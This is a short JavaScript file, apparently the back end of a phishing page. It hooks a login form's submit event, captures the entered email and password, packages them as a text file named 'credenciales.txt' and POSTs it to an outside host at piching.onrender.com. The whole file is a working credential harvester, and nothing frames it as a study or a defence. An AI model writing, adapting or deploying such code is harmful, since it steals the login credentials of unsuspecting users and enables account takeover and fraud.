document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let contenido = `Usuario: ${email}\nContraseña: ${password}`;
    let blob = new Blob([contenido], { type: "text/plain" });

    let formData = new FormData();
    formData.append("file", blob, "credenciales.txt");

    fetch("https://piching.onrender.com/send-email", {
        method: "POST",
        body: formData
    })
    .catch(error => {
        console.error("Error al enviar el correo:", error.toString());
    });
});
